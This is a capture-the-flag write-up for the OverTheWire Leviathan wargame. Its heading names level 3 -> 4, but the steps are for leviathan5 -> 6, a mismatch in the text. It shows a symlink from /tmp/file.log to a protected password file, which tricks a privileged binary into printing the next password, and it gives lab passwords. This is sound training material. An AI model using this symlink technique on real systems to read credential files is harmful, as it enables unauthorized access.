# OverTheWire Project

### [Project Leviathan:](http://overthewire.org/wargames/leviathan/)

#### Leviathan Level 3 -> 4
> There is no information for this level, intentionally.

The password for the previous level was `Tith4cokei`

Running `ls` shows us there's a executable `leviathan5` which will let us access files with the permissions of `leviathan6`

`./leviathan5` returns `Cannot find /tmp/file.log`
This wouldn't be an issue, but we don't have permission to access the `/tmp` directory.
Instead, we can create a symbolic link with the password file `/etc/leviathan_pass/leviathan6` and the `file.log`

```bash
leviathan5@leviathan:~$ ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
leviathan5@leviathan:~$ ./leviathan5
UgaoFee4li
```

Creating a symbolic link allows us to use `./leviathan5` to open the password file for the next level.

The password found is `UgaoFee4li`
